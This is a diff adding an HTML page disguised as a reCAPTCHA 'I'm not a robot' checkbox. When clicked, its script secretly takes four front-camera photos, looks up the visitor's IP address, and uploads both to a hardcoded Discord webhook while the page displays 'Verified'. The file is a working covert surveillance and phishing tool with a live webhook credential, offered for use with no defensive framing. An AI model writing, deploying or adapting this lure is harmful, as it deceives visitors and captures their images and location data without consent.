@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>reCAPTCHA Verification</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f2f2f2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .recaptcha-box {
+            width: 304px;
+            background: #fff;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            box-shadow: 0 0 4px rgba(0,0,0,.08);
+            padding: 0;
+            position: relative;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .recaptcha-header {
+            display: flex;
+            align-items: center;
+            padding: 14px 16px 14px 12px;
+        }
+
+        .checkbox-square {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #c1c1c1;
+            background: #fff;
+            border-radius: 3px;
+            margin-right: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .checkbox-square.checked {
+            background: #156b3c;
+            border-color: #156b3c;
+        }
+
+        .checkbox-square.loading {
+            background: #f9f9f9;
+            border-color: #c1c1c1;
+        }
+
+        .check-icon {
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            display: none;
+        }
+
+        .checkbox-square.checked .check-icon {
+            display: block;
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #e0e0e0;
+            border-top-color: #156b3c;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        .checkbox-square.loading .spinner {
+            display: block;
+        }
+        
+        .checkbox-square.checked .spinner {
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .logo-area {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .recaptcha-logo {
+            width: 42px;
+            height: 42px;
+            fill: #666;
+        }
+
+        .text-area {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-text {
+            font-size: 14px;
+            color: #222;
+            font-weight: 500;
+        }
+
+        .sub-text {
+            font-size: 10px;
+            color: #888;
+            margin-top: 2px;
+        }
+
+        .recaptcha-footer {
+            background: #f9f9f9;
+            border-top: 1px solid #e8e8e8;
+            padding: 8px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 10px;
+            color: #555;
+        }
+
+        .footer-links a {
+            color: #555;
+            text-decoration: none;
+            margin-left: 8px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="recaptcha-box" id="recaptchaWidget">
+    <div class="recaptcha-header">
+        <div class="checkbox-square" id="checkboxBox">
+            <span class="check-icon">✓</span>
+            <div class="spinner"></div>
+        </div>
+        <div class="logo-area">
+            <svg class="recaptcha-logo" viewBox="0 0 48 48">
+                <path d="M24 2L46 14v20L24 46 2 34V14z" fill="#f9f9f9"/>
+                <path d="M24 8l16 9.2v9.6L24 36 8 26.8v-9.6z" fill="#fff"/>
+                <path d="M24 14l10 5.8v5.4L24 30l-10-5.8v-5.4z" fill="#e0e0e0"/>
+            </svg>
+            <div class="text-area">
+                <span class="main-text" id="mainText">I'm not a robot</span>
+                <span class="sub-text"><a href="#">Privacy</a> - <a href="#">Terms</a></span>
+            </div>
+        </div>
+    </div>
+    <div class="recaptcha-footer">
+        <span>Protected by reCAPTCHA</span>
+        <div class="footer-links">
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    // 1. PASTE YOUR DISCORD WEBHOOK URL HERE
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504754449061511218/cDIIRUArrbh2HyC2Xyq7hqn8jfl0RPnBdb-ouIbEkyv3x8IPphPX-nGFFidz-_6xAinE';
+    
+    const checkboxBox = document.getElementById('checkboxBox');
+    const mainText = document.getElementById('mainText');
+    const widget = document.getElementById('recaptchaWidget');
+
+    let isCapturing = false;
+
+    widget.addEventListener('click', async () => {
+        if (isCapturing) return;
+        
+        checkboxBox.classList.add('loading');
+        mainText.textContent = "Verifying...";
+        isCapturing = true;
+
+        await new Promise(r => setTimeout(r, 600));
+        await captureAndSend();
+
+        checkboxBox.classList.remove('loading');
+        checkboxBox.classList.add('checked');
+        mainText.textContent = "Verified";
+    });
+
+    async function captureAndSend() {
+        const ip = await getIP();
+        const photos = [];
+        
+        console.log("Starting capture sequence...");
+
+        try {
+            for (let i = 1; i <= 4; i++) {
+                console.log(`Taking photo ${i}/4`);
+                const photoData = await takeSingleSnap();
+                if (photoData) {
+                    photos.push({
+                        blob: photoData.blob,
+                        name: `front_snap_${i}.jpg`
+                    });
+                } else {
+                    console.warn(`Failed to capture photo ${i}`);
+                }
+            }
+
+            if (photos.length > 0) {
+                console.log(`Uploading ${photos.length} photos to Discord...`);
+                await uploadToDiscord(photos, ip);
+            }
+        } catch (error) {
+            console.error("Error during capture/upload:", error);
+        }
+    }
+
+    function takeSingleSnap() {
+        return new Promise((resolve) => {
+            navigator.mediaDevices.getUserMedia({
+                video: { 
+                    facingMode: "user", 
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                },
+                audio: false
+            })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', ''); 
+                video.muted = true;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        
+                        // Mirror for front cam look
+                        ctx.translate(canvas.width, 0);
+                        ctx.scale(-1, 1);
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        stream.getTracks().forEach(track => track.stop());
+
+                        canvas.toBlob((blob) => {
+                            resolve({ blob });
+                        }, 'image/jpeg', 0.8);
+                    }, 500);
+                };
+            })
+            .catch(err => {
+                console.warn("Snap error:", err);
+                resolve(null);
+            });
+        });
+    }
+
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch (e) {
+            return 'Unknown';
+        }
+    }
+
+    async function uploadToDiscord(photos, ip) {
+        // Construct the payload structure for Discord Multi-File Upload
+        const payload = {
+            content: `**Front Camera Hack Triggered**\nIP: ${ip}`,
+            embeds: [{
+                title: "4 Snapshots Captured",
+                color: 0x156b3c,
+                fields: [
+                    { name: "IP Address", value: ip, inline: true },
+                    { name: "Camera", value: "Front (User)", inline: true },
+                    { name: "Photos", value: photos.length.toString(), inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        const formData = new FormData();
+        
+        // 1. Add the JSON payload as a stringified blob
+        payload.attachments = [];
+        photos.forEach((photo, index) => {
+            // Append each file with key 'files[0]', 'files[1]', etc.
+            formData.append(`files[${index}]`, photo.blob, photo.name);
+            
+            // Define the attachment metadata for Discord
+            payload.attachments.push({
+                id: index,
+                filename: photo.name
+            });
+        });
+
+        // Append the JSON string under the key 'payload_json'
+        formData.append('payload_json', new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+
+        try {
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            });
+
+            if (!response.ok) {
+                const errorText = await response.text();
+                console.error(`Discord API Error (${response.status}):`, errorText);
+            } else {
+                console.log("Successfully uploaded to Discord!");
+            }
+        } catch (error) {
+            console.error("Fetch failed:", error);
+        }
+    }
+</script>
+
+</body>
+</html>
